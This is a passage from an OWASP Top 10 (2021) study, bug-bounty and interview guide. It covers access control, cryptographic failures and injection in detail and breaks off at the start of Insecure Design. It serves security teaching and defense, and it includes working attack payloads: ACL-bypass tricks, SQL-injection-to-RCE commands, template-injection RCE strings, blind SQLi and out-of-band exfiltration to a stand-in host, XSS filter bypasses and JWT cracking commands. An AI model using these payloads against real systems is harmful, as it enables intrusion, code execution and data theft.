# OWASP Top 10 (2021) — Zero to Expert (Q&A, Bug-Bounty / Red-Team / Interview Edition)

> A complete study + field + **interview** reference for the **OWASP Top 10:2021** web risk framework. **Organized in
> Top-10 order** — everything for **A01** (what it is → how to test → red-team escalation → interview questions →
> defense) is together, then **A02**, and so on through **A10**. This is the **umbrella** companion; each concrete
> vuln-class has its own deep kit + Q&A in this repo (see the map). Learn the *categories* here; type the *payloads* in
> the kits.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, own labs. Two accounts + benign markers,
> prove impact, clean up, never test what you don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- **OWASP Top 10:2021** — official list + per-category pages (A01–A10) with CWEs & prevention: https://owasp.org/Top10/
- OWASP **WSTG** (how-to per class) · OWASP **ASVS** (verification requirements) · OWASP **Cheat Sheet Series**
- PortSwigger Web Security Academy + Research · HackTricks · PayloadsAllTheThings · The Hacker Recipes
- Companion umbrella in this repo: `OWASP_WEB_TOP_10.md`. Siblings: `../API/OWASP_API_TOP_10.md`, `../Mobile/OWASP_MOBILE_TOP_10.md`, `../AI/LLM/OWASP_LLM_TOP_10.md`.

---

## TABLE OF CONTENTS
- **§0 — The framework itself** (Q1–Q12)
- **§A01 — Broken Access Control** (Q13–Q26)
- **§A02 — Cryptographic Failures** (Q27–Q37)
- **§A03 — Injection** (Q38–Q56)
- **§A04 — Insecure Design** (Q57–Q64)
- **§A05 — Security Misconfiguration** (Q65–Q73)
- **§A06 — Vulnerable & Outdated Components** (Q74–Q80)
- **§A07 — Identification & Authentication Failures** (Q81–Q91)
- **§A08 — Software & Data Integrity Failures** (Q92–Q99)
- **§A09 — Security Logging & Monitoring Failures** (Q100–Q104)
- **§A10 — Server-Side Request Forgery (SSRF)** (Q105–Q114)
- **§XC — Cross-category chaining & reporting** (Q115–Q120)

> Each `§A0x` block runs in the same order: **Core → How to test → Red-team / escalation → Interview → Prevention.**

---

# §0 — THE FRAMEWORK ITSELF

### Q1. What is the OWASP Top 10, and what is it *not*?
> *Plain version:* it's a "most common ways web apps get hacked" list, grouped into **10 big buckets** — not 10 exact bugs. Don't tick it like a checklist: each bucket is a whole *family*, and you test every member of it.

An **awareness document** ranking the ten most critical web-application security **risk categories**, refreshed ~every 3–4 years (current stable: **2021**). It is **not** a standard, not a checklist, and not a list of individual vulnerabilities — each entry is a broad *category* that many concrete vuln-classes fall under. Treating it as "ten bugs to check" is the #1 beginner mistake; it's ten *families*, and you test every member.

### Q2. How is the 2021 list ranked, and why does that matter?
By a blend of **data** (prevalence across ~500k apps) and a **community survey** (forward-looking risks the data lags on). Eight categories are data-driven; two (A04, A10) came largely from the survey. It matters because **ranking ≠ your report's severity** — OWASP ranks by *how common + how bad on average*; your finding is scored by *demonstrated impact on this target*.

### Q3. Name the 2021 Top 10 in order.
A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection · A04 Insecure Design · A05 Security Misconfiguration · A06 Vulnerable and Outdated Components · A07 Identification and Authentication Failures · A08 Software and Data Integrity Failures · A09 Security Logging and Monitoring Failures · A10 Server-Side Request Forgery (SSRF).

### Q4. What changed from 2017 → 2021? (a very common interview question)
- **Three new categories:** A04 **Insecure Design**, A08 **Software and Data Integrity Failures**, A10 **SSRF**.
- **A01 Broken Access Control** moved from #5 to **#1**.
- **A03 Injection dropped to #3** and **absorbed XSS**.
- **Sensitive Data Exposure → A02 Cryptographic Failures** (renamed to the root cause).
- **XXE folded into A05**; **Insecure Deserialization → part of A08**; **Broken Authentication → A07** (renamed *Identification and Authentication Failures*).

### Q5. Where did XSS and XXE go in 2021?
**XSS** merged into **A03 Injection** (client-side injection). **XXE** merged into **A05 Security Misconfiguration** (a parser-config problem). Both are still real bugs with their own deep kits here (`XSS/`, `XXE/`) — they just lost standalone Top-10 slots.

### Q6. Risk category vs vulnerability class vs CWE vs CVE?
> *Plain version:* four zoom levels. **Category** = the OWASP bucket ("Injection"). **Class** = a specific kind of bug ("SQL injection"). **CWE** = an ID for that *type* of weakness ("CWE-89"). **CVE** = one *actual* hole found in one real product ("CVE-2021-44228" = Log4Shell). Real product-instance → weakness-type → family bucket.

**Risk category** (A03 Injection) = the OWASP bucket. **Vulnerability class** (SQL injection) = a concrete bug kind. **CWE** (CWE-89) = the weakness *type* ID. **CVE** (CVE-2021-44228) = a specific *instance* in a specific product. A CVE is an instance of a CWE; the CWE falls under an OWASP category.

### Q7. How do you use the Top 10 as a *method*, not memorization?
For each category: **what it is → how to test (which concrete classes) → the kit that owns the payloads → the impact ceiling → prevention.** Run by **impact**, not list order (see Q11).

### Q8. Which categories carry the RCE ceiling?
**A03** (cmdi/SSTI/SQLi-file-write→RCE), **A08** (deserialization→RCE), **A06** (known-CVE component like Log4Shell→RCE), **A10** (SSRF→cloud metadata→IAM→cloud takeover/RCE). RCE = full compromise, so bounties and CVSS peak there.

### Q9. Which category is the most common source of real breaches/high bounties?
**A01 Broken Access Control** — #1 by prevalence, trivially impactful, and scanner-resistant (authorization is app-specific logic). Start here on most engagements.

### Q10. Is there a Top 10 for non-web surfaces?
Yes — OWASP maintains **API Security (2023)**, **Mobile (2024)**, **LLM Applications (2025)**, plus Serverless/CI-CD/Docker lists. Each re-centers on its surface's failure modes. This repo has umbrella docs + Q&A for API, Mobile, and LLM.

### Q11. In what order should you actually attack the Top 10?
1) **Recon + inventory** (A05/A06 exposure, endpoints, versions). 2) **A01** access control (two-account diffs). 3) **A03** injection (RCE/dump). 4) **A10** SSRF (cloud). 5) **A07 + A08** (ATO + RCE). 6) **A02/A05** (quick wins). 7) **A04/A09** (logic abuse + detection gaps). Impact-first, not numeric.

### Q12. Interview cross-cutting — authN vs authZ, encoding vs encryption vs hashing, CVSS vs OWASP-rank, ASVS, defense-in-depth?
- **AuthN** = proving *who you are* (A07); **authZ** = *what you may do* (A01). AuthN is the gate; authZ is the rules inside.
- **Encoding** (Base64/URL) reversible/no-key/representation (not security); **encryption** reversible-with-key/confidentiality; **hashing** one-way/integrity (passwords need a *slow salted* KDF).
- **Severity = CVSS** for your specific finding; **OWASP rank is not a severity** (it's average prevalence+impact). Cite category + CWE + CVSS.
- **ASVS** = the leveled, testable *requirements* you verify against; the Top 10 is *awareness*. "Top 10 to prioritize, ASVS+WSTG to verify."
- **Defense in depth** = independent layers so one failure isn't fatal (e.g., XSS: validation + output-encoding + CSP + HttpOnly).

---

# §A01 — BROKEN ACCESS CONTROL

**Core**

### Q13. What is Broken Access Control and what are its sub-types?
> *Plain version:* "logged in" is not the same as "allowed to touch *this*." Broken access control = the app checks the first and forgets the second, so you reach other people's data (horizontal) or admin-only features (vertical). It's #1 because it's everywhere and pays big.

Users acting outside intended permissions. Sub-types: **IDOR/BOLA** (object-level), **missing function-level authz / BFLA**, **vertical** (user→admin) and **horizontal** (user→other user) escalation, **forced browsing**, **metadata/JWT/cookie** manipulation for authz, **CORS-enabled** cross-origin read, **path-based** bypass. → kits: `IDOR/`, `JWT/`, `CORS/`, `PathTraversal/`, `LFI/`.

### Q14. IDOR vs BOLA — same thing?
Effectively yes. **IDOR** is the classic web term; **BOLA** is the API term (API1). Both = "the app exposes an object reference and doesn't check you're allowed *that* object." Interviewers like that you know they're the same defect.

### Q15. Why is A01 #1 in 2021?
Most prevalent (found in a huge share of apps), high impact (cross-user/admin data → mass PII/ATO), and hard for scanners because authorization is bespoke business logic, not a signature. It moved up from #5.

**How to test**

### Q16. What's the single most productive A01 technique?
The **two-account differential**: do an action as user A, capture the exact request, replay it as user B (or against A's IDs with B's session) — success = authz not enforced server-side. **Concretely with Burp Autorize:** paste user B's (low-priv) `Cookie`/`Authorization` into Autorize's header box, then browse the whole app as user A (high-priv); Autorize silently replays every request with B's identity and colour-codes it — **green = enforced** (B was blocked), **red = bypassed** (B received A's data), **orange = needs manual review** (content-length differs). Always also test the **unauthenticated** case (strip the token entirely — a surprising number of "authed" endpoints answer with no session). A clean PoC is the *paired* evidence: identical request, two sessions, two different outcomes — "as B I retrieved A's object 1337."

### Q17. How do you test forced browsing and function-level authz?
Enumerate **unlinked/privileged paths** directly (`/admin`, `/api/internal/*`, `/user/123/promote`) with a low-priv or no token — `ffuf`/`feroxbuster`/`dirsearch` against SecLists (`raft-*`, `api/`, `common.txt`); mine JS bundles, `sitemap.xml`, and Swagger/OpenAPI for routes. If GET `/users/{id}` exists, try POST/PUT/DELETE and `/users/{id}/promote`. **When `/admin` returns 403, run the ACL-bypass matrix before giving up:** path-normalisation (`/admin/`, `/admin/.`, `/./admin`, `//admin`, `/admin..;/`, `/admin%2f`, `/%2e/admin`, trailing dot/space, case-swap `/ADMIN`), header overrides the reverse-proxy trusts (`X-Original-URL: /admin`, `X-Rewrite-URL: /admin`, `X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`), and **HTTP verb/method tampering** (403 on GET → retry with POST/HEAD/`X-HTTP-Method-Override: GET`). Distinguish 401 (auth needed) from 403 (authz denied) from 404 (hidden) — a 403 that flips to 200 via any of the above is the finding. "Button not shown" is a UI control, not a security control.

### Q18. How do JWT/cookie/parameter manipulation get tested?
Tamper client-held authz signals the server may trust: JWT `role:user→admin` (if `alg:none`/weak-secret/unverified — → `JWT/`), cookie `isAdmin=0→1`, hidden field `account_type`, mass-assign `role` in a body. Confirm the server *acts* on the tampered value.

**Red-team / escalation**

### Q19. How do you escalate a "read one other user's record" IDOR?
Push three axes: **breadth** (enumerate *all* IDs → mass PII — pipe the ID param through Burp Intruder/`ffuf` with a numeric range or a harvested UUID list), **verbs** (PUT/PATCH/DELETE also unchecked → tamper/destroy), **sensitivity** (PII/payment/admin/cross-tenant). Concrete progression: `GET /api/invoices/1337` returns *your* invoice → `1338`, `1339`… return *other users'* (read-IDOR, Medium→High); if `PUT /api/invoices/1338 {"billing_email":"attacker@evil"}` also persists, it's a **write-IDOR** (higher); if those objects carry payment data or belong to *other tenants*, it's Critical (mass cross-tenant breach). "One profile" = Medium; "enumerate + modify every account" = Critical. Always maximise **breadth × write × sensitivity** — and stop at the minimum proof (2–3 IDs), never dump the whole DB.

### Q20. How does A01 fit a kill chain?
IDOR leaks an admin's data → weak reset (**A07**) → admin ATO → stored XSS in admin panel (**A03**) → mass session theft. Or mass-assignment privilege escalation → admin functions → config change → RCE. A01 is the classic *foothold/escalation* link.

**Interview**

### Q21. "What's the difference between authentication and authorization?"
**AuthN** proves identity (A07); **authZ** decides permissions once authenticated (A01). Broken authZ (A01) is #1; broken authN (A07) is #7. Interviewers ask this constantly.

### Q22. "You can change a URL `id` and see another user's invoice. Rate and escalate it."
Baseline **High** (cross-user PII disclosure via IDOR/BOLA, CWE-639). Escalate: can I **enumerate** all invoices (mass breach → Critical)? Can I **modify/delete** (write → higher)? Whose data (payment/PII)? Prove with two own accounts ("as A I read/edited B's invoice"), then report impact-first.

**Prevention**

### Q23. How is A01 prevented?
**Deny by default**; enforce authorization **server-side on every request**, per-object *and* per-function; never trust client-supplied identity/role; ownership checks (not just unguessable IDs — that's obscurity); **centralize** the authz mechanism; log access-control failures (A09); test authz systematically (two-account diffs in CI).

### Q24. Why isn't "use UUIDs / unguessable IDs" a sufficient fix?
That's **security by obscurity** — a UUID leaked elsewhere (referrer, logs, another endpoint, an email) is still accepted because the server never checks *ownership*. Unguessable IDs are defense-in-depth; the real fix is the per-object authorization check.

### Q25. Real-world A01 examples?
Facebook/Instagram-class IDOR mass account access; mass-assignment privilege escalation (`isAdmin` in body); admin panels via forced browsing; JWT `role` tampering. Among the highest-paid bug classes.

### Q26. CWEs for A01?
CWE-284 (Improper Access Control), CWE-285 (Improper Authorization), **CWE-639** (IDOR / authz via user-controlled key), CWE-862 (Missing Authorization), CWE-863 (Incorrect Authorization), CWE-732, CWE-22. Cite CWE-639 for IDOR.

### Q26a. How do you *find* IDOR candidates quickly on a real target?
Map every request that carries an **object reference** and treat each as guilty until proven authorised: numeric IDs (`?id=`, `/orders/123`), **UUIDs**, base64 (`dXNlcjoxMjM=` → `user:123`), hashes, GraphQL `node(id:)`/`*ById`, or a `/me`/`/profile` endpoint you can swap to `/users/{id}`. Tooling: Burp **Autorize** (auto-diff, Q16), **Param Miner** (hidden params), and grep JS bundles for endpoint templates (`/api/v\d+/\w+/`). Priority order: (1) `/me` → `/{id}` substitution; (2) IDs in POST/PUT **bodies** (mass-assign + IDOR together); (3) IDs in **headers** (`X-Account-Id`, `X-User-Id`); (4) IDs *surfaced by one endpoint and consumed by another* — harvest-then-replay defeats UUID "randomness" because a leaked UUID is still accepted (Q24).

### Q26b. Both accounts return the same object for `GET /api/orders/1337` — is that automatically an IDOR?
No — first rule out **shared/public objects** and **your-own-object** false positives (the discipline that keeps A01 reports credible). Confirm the boundary: object 1337 must **belong to A**, and **B** (a separate account you control) must have **no legitimate relationship** to it, yet still receive it with B's own valid session. Baseline with a control (an ID you own vs one you don't). A real IDOR reads "as B I retrieved/modified A's *private* object 1337, which B is not entitled to." If both accounts are *meant* to see it (a public catalogue, a shared team resource), it's not a finding.

### Q26c. Give concrete mass-assignment (property-level) payloads and how to confirm one.
Add unexpected properties to a create/update body that the framework blind-binds to the model: `{"role":"admin"}`, `{"isAdmin":true}`, `{"is_verified":true}`, `{"account_type":"premium"}`, `{"balance":999999}`, `{"user_id":<victim>}`, `{"approved":true}`. Learn the real field names first from a GET response / mobile app / docs, then set them on write; try nested (`{"user":{"role":"admin"}}`) and array forms too. **Confirm with a follow-up read** — persistence is the proof (an accepted `200` that doesn't stick is not a finding). This is CWE-915 (Mass Assignment) / OWASP API3 BOPLA; frameworks with the pattern: Rails `update_attributes`, Node `Object.assign(model, req.body)`, Spring `@ModelAttribute`, Laravel `$fillable` gaps. → `IDOR/` (`massassign_fuzz`).

---

# §A02 — CRYPTOGRAPHIC FAILURES

**Core**

### Q27. What is A02 and why renamed from "Sensitive Data Exposure"?
Failures in (or absence of) cryptography exposing sensitive data. Renamed to point at the **root cause** (bad/missing crypto) rather than the *symptom* (exposed data). Covers cleartext transport/storage, weak/deprecated algorithms, poor key management, weak password hashing, predictable tokens, improper cert validation.

### Q28. Encoding vs encryption vs hashing? (classic junior filter)
**Encoding** (Base64/URL) — reversible, no key, representation only, *not security*. **Encryption** — reversible with a key, for confidentiality. **Hashing** — one-way, for integrity; passwords need a **slow, salted KDF**. Calling Base64 "encryption" is an instant red flag.

**How to test**

### Q29. First things you check for A02?
Transport (cleartext HTTP for sensitive data? missing HSTS? mixed content? cert gaps?), token/JWT crypto (`alg:none`, weak HS256 secret, RS256→HS256, no expiry — → `JWT/`), password-storage indicators (MD5/SHA1/unsalted in a disclosed dump), predictable reset/session/CSRF tokens (→ `AccountTakeover/`), secrets leaked in responses/JS/config (→ `JSFiles/`, `Recon/`).

### Q30. How do you test password-hashing strength when you get a dump?
Identify by prefix/length: 32-hex = MD5, 40-hex = SHA1, 64-hex = SHA256, `$2a$/$2b$/$2y$` = bcrypt, `$6$` = sha512crypt, `$argon2id$` = Argon2 (`hashid`/`hash-identifier` automate this). Then classify: **fast, unsalted** general hashes (raw MD5/SHA1/SHA256 — `hashcat -m 0 / -m 100 / -m 1400`) crack at *billions/sec* on a GPU → **weak (A02)**. **Adaptive, salted KDFs** — bcrypt (`-m 3200`), sha512crypt (`-m 1800`), PBKDF2-HMAC-SHA256 (`-m 10900`), Argon2id (John the Ripper, or hashcat 7.0+) — are deliberately slow with a tunable work factor → acceptable. Prove it by cracking *your own seeded test account* against `rockyou.txt`, never real users' hashes; report algorithm + speed ("unsalted MD5, ~50M candidates in 8s, seeded account cracked"). The absence of a salt (identical hashes for identical passwords, rainbow-table-able) is itself the A02 finding.

### Q31. Where does weak randomness bite?
Signals of weak randomness in security tokens (session IDs, reset/CSRF tokens, OTPs, API keys, IVs/nonces): visible **structure** (sequential, timestamp-prefixed, short), a small charset, or a known-weak generator (`java.util.Random`, JS `Math.random()`, PHP `rand()`/`mt_rand()`/`uniqid()` — all seedable/predictable). **How to test:** harvest a few hundred tokens and run **Burp Sequencer** (entropy estimate), or decode them (base64/hex) and diff consecutive values for a counter/time delta; `mt_rand` internal state can be recovered from a handful of outputs (`php_mt_seed`). A predictable **password-reset token** is the money bug → direct ATO with no user interaction. Fix: a CSPRNG — `SecureRandom` (Java), `crypto.randomBytes` (Node), `secrets`/`os.urandom` (Python) — ≥128 bits, unique IV/nonce per encryption.

**Red-team / escalation**

### Q32. How does an A02 finding become ATO/RCE?
Weak JWT secret → forge an admin token → **ATO**. Predictable reset token → seize accounts. Leaked machineKey (A02 key-management) → ViewState deserialization → **RCE** (bridges A08). Sniffed session over HTTP → hijack. The crypto weakness is usually a *step*, not the finish — chain it.

**Interview**

### Q33. "How would you store passwords correctly?"
A **slow, salted, password-specific KDF** — **Argon2id** (preferred), else bcrypt/scrypt/PBKDF2 — with a per-user salt (and ideally a server-side pepper). Never a fast general hash. Say "not MD5/SHA-*, not encryption" explicitly.

### Q34. "What is HSTS and what attack does it stop?"
`Strict-Transport-Security` tells browsers to only use HTTPS for the domain, preventing **SSL-strip / downgrade** MITM (where an attacker forces HTTP to sniff credentials). Pair with `includeSubDomains` + preload.

### Q35. "What's the difference between symmetric and asymmetric encryption?"
**Symmetric** — one shared key, fast, for bulk data (AES). **Asymmetric** — public/private key pair, slow, for key exchange/signatures (RSA/ECC). TLS uses asymmetric to exchange a symmetric session key, then symmetric for the data.

**Prevention**

### Q36. Prevention for A02?
TLS everywhere + HSTS; strong modern algorithms (AES-GCM, SHA-256+); adaptive KDFs for passwords; cryptographic RNG for all tokens; sound key management (rotation, hardware-backed, no hardcoding); classify + minimize sensitive data; don't return secrets in responses; validate certs.

### Q37. CWEs for A02?
CWE-259/261 (hardcoded/weak-protected password), CWE-319 (cleartext transmission), CWE-321 (hardcoded key), CWE-326/327 (weak/broken crypto), CWE-328 (weak hash), CWE-331 (insufficient entropy), CWE-916 (weak password hash).

### Q37a. How do you test the TLS/transport side of A02 concretely?
Run `testssl.sh <host>` (or `sslscan` / `nmap --script ssl-enum-ciphers -p443 <host>`) and flag: downgrade support (**TLS 1.0/1.1**, SSLv3), weak ciphers (RC4, 3DES, `NULL`, export-grade), missing **HSTS** (`Strict-Transport-Security`), session cookies without the `Secure`/`HttpOnly`/`SameSite` flags, **mixed content** (an HTTPS page pulling `http://` scripts), and certificate problems (expired, wrong host, weak signature/`SHA-1`). Any sensitive data over plain **HTTP** at all = A02. Impact framing: "a network-positioned attacker (rogue Wi-Fi, ARP/DNS spoofing, SSL-strip) can downgrade or intercept and read session tokens/credentials." Fix: TLS 1.2+/1.3 only, strong cipher suites, HSTS with `includeSubDomains` + preload (Q34).

### Q37b. You captured a session/reset JWT signed with HS256 — how do you attack the *crypto*?
HS256 is **symmetric** — the same secret signs and verifies — so a weak secret lets you forge tokens. Workflow: read it with `jwt_tool <token>`, then crack the secret with `hashcat -m 16500 token.txt rockyou.txt` (one mode covers HS256/384/512) or `jwt_tool -C -d rockyou.txt`. Crack succeeds → re-sign `{"sub":"admin","role":"admin"}` with the recovered secret → forge any identity → **ATO**. Adjacent crypto flaws to test: **`alg:none`** (server accepts an unsigned token), **RS256→HS256 confusion** (sign with the *public* key as the HMAC secret because the server verifies with the same key material), and no `exp` check (token never expires). These straddle A02 (broken crypto) and A07 (broken auth). → `JWT/`.

---

# §A03 — INJECTION

**Core**

### Q38. What is injection, and what unifies the class?
> *Plain version:* your input sneaks out of the "data" lane and into the "commands" lane, so an engine downstream (database, shell, template, browser) runs it. The cure is always the same idea: keep code and data in separate lanes so input can never change the *structure* of what runs.

Untrusted input is interpreted as **code/command/query** by a downstream interpreter because data and control share one string. The unifying fix is **separation of code and data** (parameterization / safe APIs / context-aware encoding) so input can never change *structure*.

### Q39. Which concrete classes live under A03 and which kits own them?
SQLi (`SQLi/`), NoSQLi (`NoSQLi/`), OS command injection (`CommandInjection/`), SSTI (`SSTI/`), XPath/XQuery (`XPath/`), LDAP (`LDAP/`), expression-language, CRLF/header injection (`OpenRedirect/` §CRLF + `HostHeader/`), server-side JS / prototype pollution (`PrototypePollution/`), XSS (`XSS/`), XXE (`XXE/`, though bucketed in A05). Largest kit cluster in the repo.

### Q40. Why did XSS get folded into Injection?
Because XSS **is** injection — input interpreted as **code by the browser** (HTML/JS). Same root cause (data-as-control), same fix family (context-aware output encoding + sanitization). Grouping reflects the mechanism, not the location.

**How to test**

### Q41. How do you detect injection with low false positives?
**Prove interpretation, not reflection.** A reflected `'`/`;` is not a bug. Confirm the interpreter *acted* — four reliable oracles: (1) **boolean-differential** — `' AND '1'='1` vs `' AND '1'='2` return *different* pages; (2) **time-based** — a payload that sleeps (`' AND SLEEP(5)-- -`) delays the response *repeatably* vs a 0-second control (run it 3× to rule out network jitter); (3) **out-of-band (OOB)** — the payload makes the server call *your* listener (Burp **Collaborator** / `interactsh`) with a per-injection marker, e.g. MySQL `LOAD_FILE('\\\\marker.oob.net\\x')`, so you catch blind bugs with no visible response; (4) **real output** — an error string or `UNION`-returned data. Control-baseline every probe (send the benign version first) so you're comparing against a known-good response, not guessing.

### Q42. How do you quickly distinguish SSTI vs XSS vs code injection?
Math probe `{{7*7}}` / `${7*7}` / `<%= 7*7 %>`: renders **49** *server-side* → **SSTI** (→ often RCE); reflected and executes in the *browser* → **XSS**; language `eval` of input → **code injection**. Then **fingerprint the engine** because the RCE payload differs: `{{7*'7'}}` → `49` = **Twig** (PHP); `{{7*'7'}}` → `7777777` = **Jinja2** (Python); `${7*7}`→49 with `#{}` support = **Freemarker/Velocity** (Java); `<%= 7*7 %>`→49 = **ERB** (Ruby); `{7*7}`→49 = **Smarty** (PHP). The classic SSTI decision tree is in PortSwigger's research; then pick the engine's RCE gadget (Q56a). → `SSTI/`.

### Q43. What is second-order (stored) injection?
Payload **stored** on one request, executed on a **later** one in a different context (username saved now, concatenated into an admin query later). Detection requires tracking where stored values are *reused*, defeating naive per-request scanners.

### Q44. What's CRLF / header injection?
Injecting `\r\n` into a header context (value reflected into `Location`/`Set-Cookie`) → **response splitting**, cookie injection, cache poisoning, open-redirect chaining. Under A03; covered by `OpenRedirect/` (§CRLF) + `HostHeader/`.

**Red-team / escalation**

### Q45. What's the impact ceiling per major injection class?
SQLi → dump/auth-bypass/file-RW→webshell→**RCE**/lateral; command injection & SSTI → direct **RCE**; NoSQLi → auth bypass + blind exfil (→ RCE on some engines); XSS → session theft/**ATO**/worm; LDAP/XPath → auth bypass + directory/XML dump. Top source of Criticals.

### Q46. How does SQLi become RCE?
Per DBMS: **MSSQL** — `EXEC xp_cmdshell 'whoami'` (re-enable via `sp_configure` if off); **PostgreSQL** — `COPY (SELECT '') TO PROGRAM 'id'` (9.3+) or a `CREATE FUNCTION` C/PLpython UDF; **MySQL/MariaDB** — `... INTO OUTFILE '/var/www/html/s.php'` to drop a webshell in the webroot (needs `FILE` priv + `secure_file_priv` unset + known path), or a `lib_mysqludf_sys` UDF; **Oracle** — Java stored procedures / `DBMS_SCHEDULER`. Also **file read** of source/secrets (`LOAD_FILE`, `pg_read_file`) and **lateral movement** via linked servers (`EXEC ... AT linkedsrv`). Prove with a benign marker (`whoami`/OOB DNS), not a destructive command. → `SQLi/`.

### Q47. How does command injection reach cloud takeover?
RCE → read cloud metadata (`169.254.169.254`) → **IAM credentials** → assume role → cloud account takeover. Or pivot internally, read secrets, drop persistence. The category's job in a chain is code execution or credentials.

**Interview**

### Q48. "How do you prevent SQL injection?"
**Parameterized queries / prepared statements** (separate code from data so input can't change query structure). Supplement with least-privilege DB accounts, allow-list validation, a correctly-used ORM. Explicitly: "not escaping/blacklisting" — that's the tell you know the real fix.

### Q49. "Stored vs reflected vs DOM XSS?"
**Reflected** — request payload echoed in the immediate response (needs a click). **Stored** — saved server-side, served to *every* viewer (worse). **DOM** — injection happens client-side in JS (source like `location.hash` → sink like `innerHTML`), often invisible to the server. → `XSS/`.

### Q50. "What is CSRF and how is it different from XSS?"
**CSRF** — attacker's site makes the victim's browser send a *state-changing* request to a site where the victim is authed, abusing ambient cookies (attacker can't read the response). **XSS** — attacker runs *script in the victim's context* (reads data, does anything). XSS is strictly stronger and defeats most CSRF defenses. Fix CSRF: SameSite + anti-CSRF tokens. → `CSRF/`.

### Q51. "What's the difference between SQLi and NoSQLi?"
SQLi targets an SQL parser (string/query structure via quotes/UNION/comments). NoSQLi targets document/operator stores — **operator injection** (`{"$ne":null}` auth bypass, `$gt`/`$regex`) and **server-side JS** (`$where`) for blind exfil. Different syntax, similar ceilings (auth bypass, exfil, sometimes RCE). → `NoSQLi/`.

**Prevention**

### Q52. Prevention per injection class?
Parameterized queries (SQL); operator allow-listing / safe query builders (NoSQL); **avoid the shell**, use exec-array APIs (command); sandbox/disable dangerous template features + never template user input (SSTI); context-aware output encoding + CSP + sanitizer (XSS); escape for the exact interpreter; least-privilege service accounts to cap blast radius.

### Q53. What is CSP and how does it mitigate XSS?
Content-Security-Policy restricts which script sources execute (nonce/hash/allow-list, no inline). Even if an injection lands, a strict CSP blocks the script from running — defense-in-depth behind output encoding. It mitigates, doesn't cure; still fix the injection.

### Q54. CWEs for A03?
CWE-79 (XSS), CWE-89 (SQLi), CWE-78 (OS command), CWE-90 (LDAP), CWE-91/643 (XML/XPath), CWE-94 (code), CWE-1336/917 (template/expression-language), CWE-74 (generic injection).

### Q55. Real-world A03 examples?
Endless SQLi breaches; SSTI-to-RCE (Jinja2/Twig); command injection in image/PDF processors (ImageTragick, Ghostscript); stored XSS session theft; NoSQLi auth bypass (`{"$ne":null}`).

### Q56. What's the difference between a WAF blocking a payload and the bug being fixed?
A **WAF** is a bypassable edge filter matching known patterns — it doesn't fix the code. The bug is fixed only when the sink is made safe (parameterization/encoding). Always report the underlying bug; note the WAF as mitigation, not remediation.

### Q56a. Give the go-to SSTI → RCE payloads per engine.
Once fingerprinted (Q42), these pop a benign `id`:
- **Jinja2 (Python/Flask):** `{{cycler.__init__.__globals__.os.popen('id').read()}}` or `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` (both walk from a reachable object to `os`).
- **Twig (PHP/Symfony):** `{{['id']|filter('system')}}` or `{{['id',1]|sort('system')}}`, or `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}` (older Twig).
- **Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- **Smarty (PHP):** `{system('id')}` or `{php}system('id');{/php}`.
- **ERB (Ruby):** `<%= system('id') %>` or `` <%= `id` %> ``.

Use `tplmap` to automate detection + exploitation. Always use a **benign** command (`id`/`whoami`/OOB) — one proof, then stop. → `SSTI/`.

### Q56b. How do you extract data with blind (boolean / time-based) SQLi?
When there's no visible output, turn the DB into a yes/no oracle and binary-search each character:
- **Boolean:** `' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'-- -` — page *changes* when the guess is right. Binary-search with `>`/`<` on `ASCII()` (7 requests/char instead of ~50).
- **Time-based** (no visible difference at all): MySQL `' AND IF(ASCII(SUBSTRING((SELECT ...),1,1))>77, SLEEP(3), 0)-- -`; MSSQL `'; IF(...) WAITFOR DELAY '0:0:3'--`; PostgreSQL `' AND (SELECT CASE WHEN (...) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -`.
- **OOB** (fastest exfil where allowed): MSSQL `xp_dirtree '\\'+(SELECT ...)+'.oob.net\x'` / Oracle `UTL_HTTP`/`UTL_INADDR` — the secret arrives as a DNS lookup at your listener.

Automate with `sqlmap` (`--technique=BT`, `--dump`), but understand the manual oracle for reports and WAF'd targets. Extract only enough to prove impact (one hash), never the whole table. → `SQLi/`.

### Q56c. How do you bypass a filter/WAF on reflected XSS?
Escalate through the standard ladder: (1) **alternative vectors** if `<script>` is blocked — `<img src=x onerror=alert(document.domain)>`, `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`, `<body onload=…>`; (2) **case/encoding** — `<sCrIpt>`, HTML entities (`&#x6a;avascript:`), URL/double-URL/unicode encoding, `alert`; (3) **no parentheses/quotes** (blocked chars) — `<svg onload=alert`1`>` (template literal), `onerror=alert(document.cookie)`; (4) **context breakout** — if you land in an attribute, close it (`"><svg onload=…>`); in JS, break the string (`';alert(1)//`); (5) **DOM sinks** — `location.hash`/`document.write`/`innerHTML` often skip the server filter entirely. If a **CSP** blocks inline JS, hunt for an allow-listed host, a JSONP endpoint, or a `nonce` reuse. Report the working PoC firing in the victim's origin, and cite the real impact (session/`document.cookie` theft → ATO), not `alert(1)`. → `XSS/`.

---

# §A04 — INSECURE DESIGN

**Core**

### Q57. What is Insecure Design in one line?
> *Plain version:* the difference between "built it wrong" (a coding bug) and "built the wrong thing" (a design flaw). If there's simply no rate limit *by design* on password reset, no amount of input-cleaning fixes it — the plan itself has to change. That's A04.

A **missing or ineffective security control at the design level** — the flaw is in *what was designed*, not a coding mistake, so it can't be patched with input handling; it needs a design change (threat modeling, secure patterns, abuse-case testing). New in 2021.

### Q58. The canonical example distinguishing A04 from an implementation bug?
A password-reset flow with **no rate limiting by design** → unlimited OTP/token guessing → ATO. Validation doesn't help; the *design* omitted anti-automation. Contrast: an SQLi in that endpoint is an *implementation* bug (A03). Same feature, different category.

**How to test**

### Q59. What concrete testing lives under A04?
